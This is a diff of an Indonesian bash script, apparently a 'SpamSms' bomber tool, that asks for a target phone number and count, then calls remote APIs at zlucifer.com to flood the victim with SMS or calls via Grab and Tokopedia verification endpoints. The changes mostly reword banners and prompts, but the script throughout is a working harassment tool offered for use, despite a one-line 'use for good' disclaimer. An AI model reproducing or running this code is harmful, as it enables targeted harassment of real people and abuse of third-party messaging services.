@@ -3,17 +3,16 @@
 #GUNAKAN TOOLS UNTUK KEBAIKAN JANGAN DISALAH GUNAKAN :)
 troll(){
     clear
-    sleep 0.03
 toilet -f big -F gay By MasterZ
+    sleep 0.03
     echo " ============================="
-    echo "Group : Nasional Operation Center" 
-    echo "Instagram : @MasterZ345"
-    echo "Tools By : MasterZ
+    echo "Tools By : MasterZ Official"
+    echo "Group : Nasional Operation Center"
     echo " ============================="
 }
 load(){
     echo -e "\n"
-    bar=" ••••••••Tunggu Sayang•••••• "
+    bar=" ••••••••Tunggu Sebentar Sayang•••••• "
     barlength=${#bar}
     i=0
     while((i<100)); do
@@ -26,14 +25,14 @@ load(){
 get_sms=$(curl -s http://zlucifer.com/api/hackbae.php?request=sms)
 get_call=$(curl -s http://zlucifer.com/api/hackbae.php?request=call)
 mulai (){
-    echo "Mulai Spam SMS?"
+    echo "Gunakan Spam sms?"
     echo "y/n?"
     echo
     read lagi
     if [ $lagi = "y" ]; then
             spam
     else
-            echo "Terima Kasih Atas Supportnya"
+            echo "Terimakasih Untuk Supportnya"
     fi
 }
 #spam
@@ -41,21 +40,21 @@ spam(){
     clear
     troll
     echo
-    echo "[1] Spam SMS Unlimited"
-    echo "[2] Spam Telp Unlimited"
+    echo "[1] Spam SMS"
+    echo "[2] Spam Telp"
     echo "[3] Exit"
     echo
     echo "1/2/3?"
     read pilih
     if [ $pilih = "1" ]; then
-            echo " Spam SMS Unlimited"
+            echo " Spam SMS"
             #function spam
             echo
             echo "Silahkan masukan nomor telp target"
             echo contoh 0812345678
             read target # masukin no telp
             echo
-            echo "Berapa Penyerangan yang mau dikirim?"
+            echo "Berapa sms yang mau dikirim?"
             read paket
             echo
             echo Apakah nomor $target "dan SMS dikirim "$paket" sudah benar?"
@@ -65,28 +64,30 @@ spam(){
             if [ $confirm = "y" ]; then
                     load
                     clear
-                    echo Melakukan Penyerangan SMS ke nomor $target
+                    echo Melakukan spam SMS ke nomor $target
                     echo
-                    echo "Tunggu Aja beb... "
+                    echo "Tunggu Lagi Loading"
                     echo "========================================"
                     target_do=$get_sms'/sms.php?nomor='$target'&paket='$paket
                     CURL_RESPONSE=`curl -s -o /dev/null -w "%{http_code}" $target_do`
-                    echo "Group : Nasional Operation Center"
-                    echo "Tools By : MasterZ"
+                    echo " Gunakan Tools Sesuai Kebutuhan"
+                    echo
+                    echo " Wow Banget!!"
+                    echo " MasterZ Official"
                     echo "======================================="
             else
-                    echo "Mungkin Dia Lelah"
+                    echo "Kesalahan"
             fi
         mulai
     elif [ $pilih = "2" ]; then
-            echo "Spam Call Unlimited"
+            echo "Spam Call"
             #function spam
             echo
-            echo "Ketikan Nomor  target"
+            echo "Silahkan masukan nomor telp target"
             echo contoh 0812345678
             read target # masukin no telp
             echo
-            echo "Serang Pakai Grab/ToKoPedia?"
+            echo "Gunakan API Grab/Toped?"
             echo "[1] GRAB"
             echo "[2] TOPED"
             echo "1/2?"
@@ -103,21 +104,23 @@ spam(){
             if [ $confirm = "y" ]; then
                   load
                   clear
-                  echo Melakukan Penyerangan Call ke nomor $target
+                  echo Melakukan spam call ke nomor $target
                   echo
-                  echo "Tunggu Aja Beb..." 
+                  echo "Jangan close aplikasi sebelum spam selesai"
                   echo "========================================"
                   cek_target=`curl -s $get_call/call.php?nomor=$target"&method="$api_spam`
                   echo -e $cek_target
-                  echo "Group : Nasional Operation Center"
-                  echo "Tools By : MasterZ"
+                  echo " Gunakan tools dengan bijak"
+                  echo
+                  echo " Love u always "
+                  echo " RandiSr"
                   echo "========================================"
             else
                   echo Kesalahan, silahkan coba lagi
             fi
         mulai
     elif [ $pilih = "3" ]; then
-        echo "Terimakasih sudah menggunakan Penyerangan"
+        echo "Terimakasih sudah menggunakan SpamSms"
         close
     else
         clear
@@ -129,15 +132,15 @@ close(){
     exit
 }
 clear
-echo "Loading Server... "
+echo "Loading.."
 load
 clear
 troll
-echo Selamat datang , Ketik nick anda? #tulisan keluar
+echo Selamat datang kak, Siapa nick kaka? #tulisan keluar
 read nick #membaca yang ditulis
 clear
 troll
-echo "Selamat datang $nick ":)"
+echo Selamat datang $nick ":)"
 echo
 echo "Mulai SpamSms?"
 echo "y/n?"
